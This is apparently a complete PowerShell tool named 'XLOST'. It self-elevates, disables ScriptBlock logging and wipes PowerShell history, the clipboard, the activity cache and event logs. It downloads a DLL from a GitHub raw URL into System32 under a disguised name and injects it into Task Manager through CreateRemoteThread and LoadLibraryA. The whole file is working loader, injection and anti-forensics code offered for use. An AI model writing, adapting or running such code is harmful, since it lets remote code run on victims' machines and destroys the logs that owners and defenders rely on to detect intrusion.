# 1. Administrator Privileges Check & Auto-Elevation
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. Disable PowerShell ScriptBlock Logging temporarily
try {
    $RegistryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not (Test-Path $RegistryPath)) {
        New-Item -Path $RegistryPath -Force | Out-Null
    }
    Set-ItemProperty -Path $RegistryPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# Cleanup History (Clear content only) & Clipboard
Clear-History
try {
    $HistoryPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $HistoryPath) {
        Clear-Content $HistoryPath -ErrorAction SilentlyContinue
    }
} catch {}

try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    [System.Windows.Forms.Clipboard]::Clear()
} catch {}
cmd.exe /c "echo off | clip" 2>$null
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:LOCALAPPDATA\ConnectedDevicesPlatform\*\ActivitiesCache.db*" -Force -ErrorAction SilentlyContinue
Start-Service -Name "cbdhsvc*" -ErrorAction SilentlyContinue

# 3. Console Styling & Compact Window Size
$host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
$host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(40, 7.5)
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(40, 7.5)

# 4. Global Paths & Configuration
$global:TargetDir = "C:\Windows\System32"
$global:DllName = "aadtbs.dll"
$global:DllFullPath = Join-Path $global:TargetDir $global:DllName
$global:DirectUrl = "https://raw.githubusercontent.com/punvertwo-sys/DLLXLOST/refs/heads/main/XLOST.dll"

# 5. C# P/Invoke for Windows API
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type -TypeDefinition $code -Language CSharp

# 6. Core Functions
function Invoke-InstallDll {
    if (-not (Test-Path $global:TargetDir)) {
        New-Item -ItemType Directory -Force -Path $global:TargetDir | Out-Null
    }

    Write-Host "[*] Downloading DLL from direct link..." -ForegroundColor Cyan
    try {
        $tempFile = Join-Path $global:TargetDir "temp_download.dll"
        $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
        Invoke-WebRequest -Uri $global:DirectUrl -OutFile $tempFile -Headers $headers -UseBasicParsing
        
        if (Test-Path $global:DllFullPath) {
            Remove-Item $global:DllFullPath -Force
        }
        
        Rename-Item -Path $tempFile -NewName $global:DllName
        Write-Host "[+] Installed & renamed to '$global:DllName'!" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Download failed: $_" -ForegroundColor Red
    }
}

function Invoke-RunInjection {
    if (-not (Test-Path $global:DllFullPath)) {
        Write-Host "[-] DLL not found! Please Install first." -ForegroundColor Red
        return
    }

    $process = Start-Process taskmgr.exe -PassThru
    Start-Sleep -Milliseconds 800
    $pidNum = $process.Id

    $PROCESS_ALL_ACCESS = 0x001F0FFF
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_EXECUTE_READWRITE = 0x40

    $hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pidNum)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to open process handle." -ForegroundColor Red
        return
    }

    $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($global:DllFullPath + "`0")
    $allocMem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
    if ($allocMem -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to allocate memory." -ForegroundColor Red
        return
    }

    $bytesWritten = [IntPtr]::Zero
    $writeResult = [WinAPI]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, [uint32]$dllBytes.Length, [ref]$bytesWritten)
    if (-not $writeResult) {
        Write-Host "[-] Failed to write process memory." -ForegroundColor Red
        return
    }

    $kernel32 = [WinAPI]::GetModuleHandle("kernel32.dll")
    $loadLibraryAddr = [WinAPI]::GetProcAddress($kernel32, "LoadLibraryA")

    $hThread = [WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to create remote thread." -ForegroundColor Red
        return
    }

    Write-Host "[+] Injection successful! (PID: $pidNum)" -ForegroundColor Green
}

function Invoke-UninstallDll {
    if (Test-Path $global:DllFullPath) {
        Remove-Item $global:DllFullPath -Force
        Write-Host "[+] DLL successfully removed from system." -ForegroundColor Green
    } else {
        Write-Host "[!] DLL file does not exist." -ForegroundColor Yellow
    }
}

# 7. Main Menu Loop
do {
    Clear-Host
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    Write-Host "                XLOST                   " -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
    Write-Host "  [1]  INSTALL" -ForegroundColor White
    Write-Host "  [2]  RUN" -ForegroundColor White
    Write-Host "  [3]  UNINSTALL" -ForegroundColor White
    Write-Host "  [4]  EXIT" -ForegroundColor White
    Write-Host "────────────────────────────────────────" -ForegroundColor DarkCyan
    $choice = Read-Host "  SELECT CHOICE [1-4]"

    switch ($choice) {
        '1' {
            Invoke-InstallDll
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '2' {
            Invoke-RunInjection
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '3' {
            Invoke-UninstallDll
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 2
        }
        '4' {
            Write-Host " Exiting and clearing traces..." -ForegroundColor Cyan
            & wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            & wevtutil cl "Windows PowerShell" 2>$null
            Clear-History
            try {
                $HistoryPath = (Get-PSReadLineOption).HistorySavePath
                if (Test-Path $HistoryPath) {
                    Clear-Content $HistoryPath -ErrorAction SilentlyContinue
                }
            } catch {}
            Start-Sleep -Seconds 1
            break
        }
        default {
            Write-Host "[!] Invalid option! Please try again." -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne '4')
